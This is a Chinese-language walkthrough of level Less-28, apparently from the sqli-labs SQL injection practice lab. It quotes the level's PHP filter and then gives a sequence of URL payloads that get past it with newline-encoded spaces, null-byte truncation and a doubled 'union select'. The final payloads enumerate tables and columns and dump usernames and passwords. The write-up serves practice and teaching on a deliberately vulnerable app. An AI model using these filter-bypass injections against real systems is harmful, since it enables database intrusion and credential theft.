# Less28

这关过滤的是union select这个整体，源码如下：

~~~ php
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
~~~

注释绕过参考23关，空格用%0a绕过，union select绕过也很简单直接将这个整体双写即可。需要注意的是这里没有报错提示。



输入：

~~~ php
?id=2%27)%0aand%0a1=1;%00
~~~

![Less-28-01](./img/Less-28-01.png)



继续输入:

~~~ txt
?id=2%27)%0aand%0a1=2;%00
~~~

![Less-28-02](./img/Less-28-02.png)



输入:

~~~ txt
?id=2%27)%0aorder%0aby%0a3;%00
~~~

![Less-28-03](./img/Less-28-03.png)



输入：

~~~ txt
?id=2%27)%0aorder%0aby%0a4;%00
~~~

![Less-28-04](./img/Less-28-04.png)



输入：

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
~~~

![Less-28-05](./img/Less-28-05.png)



继续输入:

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,database();%00
~~~

![Less-28-06](./img/Less-28-06.png)



继续输入

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security');%00
~~~

![Less-28-07](./img/Less-28-07.png)



继续输入:

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0aand%0atable_name='users');%00
~~~

![Less-28-08](./img/Less-28-08.png)



输入：

~~~ txt
?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(username,password)%0afrom%0ausers);%00
~~~

![Less-28-09](./img/Less-28-09.png)



其中’**%27**’可以被url解码为‘ **单引号**，而**%0a**被解码为**换行符**，而%00则被url解码为 **ASCII 值为0的字符**，即 **NUL（空字符）**

